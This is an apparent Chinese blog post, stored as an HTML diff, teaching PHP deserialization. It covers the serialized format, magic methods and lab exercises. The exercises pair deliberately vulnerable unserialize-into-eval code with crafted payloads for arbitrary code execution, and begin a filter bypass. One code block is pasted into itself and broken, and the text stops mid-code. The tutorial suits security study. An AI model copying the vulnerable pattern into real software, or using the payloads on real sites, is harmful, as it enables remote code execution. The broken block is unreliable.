@@ -1,0 +1,528 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>序列化与反序列化-个人笔记 | 木良</title><meta name="keywords" content="序列化与反序列化"><meta name="author" content="木良"><meta name="copyright" content="木良"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="序列化与反序列化-知识点详解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="序列化与反序列化-个人笔记">
+<meta property="og:url" content="https://www.webgg.ml/2020/01/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="木良">
+<meta property="og:description" content="序列化与反序列化-知识点详解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2022/10/13/xdGtOg.jpg">
+<meta property="article:published_time" content="2020-01-06T16:37:00.000Z">
+<meta property="article:modified_time" content="2022-10-18T13:39:47.409Z">
+<meta property="article:author" content="木良">
+<meta property="article:tag" content="序列化与反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2022/10/13/xdGtOg.jpg"><link rel="shortcut icon" href="https://s1.ax1x.com/2022/10/13/xd30Bj.jpg"><link rel="canonical" href="https://www.webgg.ml/2020/01/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E8%AF%A6%E8%A7%A3/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 木良","link":"链接: ","source":"来源: 木良","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-photos/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-photos/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '序列化与反序列化-个人笔记',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-10-18 21:39:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/shubiao.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path><link rel="stylesheet" href="APlayer.min.css"><div id="aplayer"></div><script src="https://cdn.jsdelivr.net/gh/radium-bit/res@master/live2d/autoload.js" async></script><script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js" async></script></symbol></svg><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-double-row-display@1.00/cardlistpost.min.css"/>
+<style>#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags:before {content:"\A";
+  white-space: pre;}#recent-posts > .recent-post-item >.recent-post-info > .article-meta-wrap > .tags > .article-meta__separator{display:none}</style>
+<link rel="stylesheet" href="/css/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s1.ax1x.com/2022/10/13/xd3n1O.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s1.ax1x.com/2022/10/13/xdGtOg.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">木良</a></span><div id="he-plugin-simple"></div><div id="none_space"></div><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">序列化与反序列化-个人笔记</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-01-06T16:37:00.000Z" title="发表于 2020-01-07 00:37:00">2020-01-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-10-18T13:39:47.409Z" title="更新于 2022-10-18 21:39:47">2022-10-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">序列化与反序列化</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="序列化与反序列化-个人笔记"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="PHP序列化与反序列化详解"><a href="#PHP序列化与反序列化详解" class="headerlink" title="PHP序列化与反序列化详解"></a>PHP序列化与反序列化详解</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化:将变量转换为可保存或传输的字符串的过程；</span><br><span class="line">反序列化:在适当的时候把这个字符串再转化成原来的变量使用。</span><br><span class="line">优点:这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</span><br></pre></td></tr></table></figure>
+
+<h5 id="例子1"><a href="#例子1" class="headerlink" title="例子1"></a>例子1</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例子:将一大段对象序列化压缩成字符串.然后根据要求反序列化重新构造对象.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666006709348.png" alt="例子-对象压缩成字符串"></p>
+<p><img src="/images/1666006419469.png" alt="例子-字符串还原成对象"></p>
+<h5 id="例子2"><a href="#例子2" class="headerlink" title="例子2"></a>例子2</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">再例如:网购家具,店家把家具拆分打包邮寄过来的过程就是序列化，反序列化就是买家根据说明书自定义将商品还原过程。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666070634202.png" alt="例子2-桌子拆分"></p>
+<p><img src="/images/1666070684039.png" alt="例子2-桌子组装还原"></p>
+<h3 id="字符解释"><a href="#字符解释" class="headerlink" title="字符解释"></a>字符解释</h3><h5 id="字符详解"><a href="#字符详解" class="headerlink" title="字符详解"></a>字符详解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Person&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;tom&quot;;  s:11:&quot;Personage&quot;;  i:18;   s:6:&quot;*sex&quot;; s:3:&quot;boy&quot;;&#125;</span><br><span class="line"></span><br><span class="line">O : 自定义对象 object</span><br><span class="line">6  : 类名的长度</span><br><span class="line">:3 : 3个成员属性</span><br><span class="line">S:4 : 你的成员属性名  长度为4 ,并且是一个字符串   string</span><br><span class="line">S:3 : 刚刚那个成员属性对应的值 是string类型,并且长度是3位</span><br><span class="line">s:11:&quot;Personage&quot; : 因为该属性是私有属性,所以需要在属性名前加上类名,方便我们进行反序列化的时候的识别.</span><br><span class="line">i:18 :  18是age的属性值 , i是代表  integer类型</span><br><span class="line"></span><br><span class="line">s:6:&quot;*sex&quot;;  sex这个属性是一个受保护的属性,特征就是 * 号</span><br><span class="line"></span><br><span class="line">s:3:&quot;boy : 代表 string类型,属性值长度为3位  boy对应是  sex的属性值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666006992952.png" alt="字符解释"></p>
+<h5 id="private和-protected详解"><a href="#private和-protected详解" class="headerlink" title="private和 protected详解"></a>private和 protected详解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP 序列化的时候 private和 protected 变量会引入不可见字符%00，%00类名%00属性名 为private，%00*%00属性名 为protected，注意这两个 %00就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看.</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/1666007031526.png" alt="字符解释"></p>
+<h3 id="PHP常见魔术方法"><a href="#PHP常见魔术方法" class="headerlink" title="PHP常见魔术方法"></a>PHP常见魔术方法</h3><h5 id="construct"><a href="#construct" class="headerlink" title="__construct"></a>__construct</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct：构造函数,会在每次创建新对象时先调用此方法</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666007580220.png" alt="__construct"></p>
+<h5 id="destruct"><a href="#destruct" class="headerlink" title="__destruct"></a>__destruct</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__destruct：析构函数,会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666007704969.png" alt="__destruct"></p>
+<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__toString：返回一个类被当做字符串时要输出的内容，此方法必须返回字符串并且不能在此方法中抛出异常，否则会产生致命错误。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666007830582.png" alt="__tostring"></p>
+<h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__invoke：PHP5.3起，当尝试以函数的方式调用对象时，会调用此方法。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666007994884.png" alt="__invoke"></p>
+<h5 id="call"><a href="#call" class="headerlink" title="__call"></a>__call</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call : 在对象中调用一个不可访问方法时调用。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666008283124.png" alt="__call"></p>
+<h5 id="sleep"><a href="#sleep" class="headerlink" title="__sleep"></a>__sleep</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep：返回一个包含对象中所有应被序列化的变量名称的数组。serialize函数在序列化类时首先会检查类中是否存在__sleep方法。如果存在，会先调用此方法然后再执行序列化操作。并且只对__sleep返回的数组中的属性进行序列化。如果</span><br><span class="line">__sleep不返回任何内容，则null会被序列化，并产生E_NOTICE级别的错误。__sleep不能返回父类的私有成员，否则会产生E_NOTICE级别的错误。对于一些很大但不需要保存全部数据的对象此方法很有用。</span><br><span class="line">即序列化serialize时会调用__sleep.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666008877857.png" alt="__sleep"></p>
+<h5 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup"></a>__wakeup</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup：与__sleep相反，是在unserialize函数反序列化时首先会检查类中是否存在__wakeup方法，如果存在会先调用次方法然后再执行反序列化操作。用于在反序列化之前准备一些对象需要的资源，或其他初始化操作。</span><br><span class="line">即反序列化unserialize时会自动调用__wakeup</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666009217308.png" alt="__wakeup"></p>
+<h3 id="PHP反序列化练习"><a href="#PHP反序列化练习" class="headerlink" title="PHP反序列化练习"></a>PHP反序列化练习</h3><h4 id="一-初步认识"><a href="#一-初步认识" class="headerlink" title="一.初步认识"></a>一.初步认识</h4><p>任务:通过传参让页面出现phpinfo界面</p>
+<p>1.构建环境</p>
+<p><img src="/images/1666010195924.png" alt="习题代码"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">action</span>();</span><br></pre></td></tr></table></figure>
+
+<p>2,分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload   O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:10:&quot;phpinfo();&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>①新建新文件用于存放预构造的代码 </p>
+<p>②实例化一个对象,将其序列化的内容打印出来</p>
+<p>③得到其序列化的结果</p>
+<p><img src="/images/1666010166025.png" alt="习题分析"></p>
+<p>3.完成任务</p>
+<p><img src="/images/1666010278300.png" alt="习题完成"></p>
+<ol start="4">
+<li>加班-&gt;任意代码执行</li>
+</ol>
+<p><img src="/images/1666010371475.png" alt="习题代码"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class one</span><br><span class="line">&#123;</span><br><span class="line">    var $b = &#x27;phpinfo();&#x27;;</span><br><span class="line"></span><br><span class="line">    function action()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = unserialize($_GET[1]);</span><br><span class="line">$a-&gt;action();</span><br></pre></td></tr></table></figure>
+
+<p>5.习题解析</p>
+<p>新建新文件用于存放预构造的代码,重新构造代码,将其实例化一个对象,把其序列化的内容打印出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666010911581.png" alt="习题解析"></p>
+<p>6.执行命名,例如echo 123</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">paload O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&amp;2=echo 123;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666010872030.png" alt="习题完成"></p>
+<p>总结 :在考虑完过滤等先决条件后,找到可控点,构造成我们想要执行的代码,将其反序列化利用。这个过程不要去看原来代码想要执行的,关键是去构造你要执行的</p>
+<h4 id="二-简单利用"><a href="#二-简单利用" class="headerlink" title="二.简单利用"></a>二.简单利用</h4><p>任务:输出phpinfo或者其他任意代码执行</p>
+<p>1.构建环境</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$b</span> = <span class="string">&#x27;echo 123;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666012058017.png" alt="习题代码"></p>
+<p>2.解析,同理</p>
+<p>①新建新文件用于存放预构造的代码 </p>
+<p>②实例化一个对象,将其序列化的内容打印出来</p>
+<p>③得到其序列化的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/1666012436784.png" alt="习题解析"></p>
+<p>3.完成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload O:7:&quot;Student&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;one&quot;:1:&#123;s:1:&quot;b&quot;;s:15:&quot;eval($_GET[2]);&quot;;&#125;&#125;&amp;2=phpinfo();</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/1666012363178.png" alt="习题完成"></p>
+<h4 id="三-相关绕过"><a href="#三-相关绕过" class="headerlink" title="三.相关绕过"></a>三.相关绕过</h4><p>任务:访问当前目录的1.txt文件</p>
+<p>1.构造环境:当前目录创建1.txt 输入任意内容,通过反序列化读取文件内容</p>
+<p><img src="/images/1666013578861.png" alt="构造环境"></p>
+<p>习题代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(1);</span><br><span class="line">echo $_GET[&#x27;data&#x27;];</span><br><span class="line">class baby</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function &lt;?php</span><br><span class="line">@error_reporting(1);</span><br><span class="line">echo $_GET[&#x27;data&#x27;];</span><br><span class="line">class baby</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = &quot;./&#123;$this-&gt;file&#125;&quot;;</span><br><span class="line">            if (file_get_contents($filename))</span><br><span class="line">            &#123;</span><br><span class="line">                return file_get_contents($filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_GET[&#x27;data&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $data = $_GET[&#x27;data&#x27;];</span><br><span class="line">    preg_match(&#x27;/[oc]:\d+:/i&#x27;,$data,$matches);</span><br><span class="line">    if(count($matches))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;Hacker!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $good = unserialize($data);</span><br><span class="line">        echo $good;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(&quot;./test4.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;file))</span><br><span class="line">        &#123;</span><br><span class="line">            $filename = 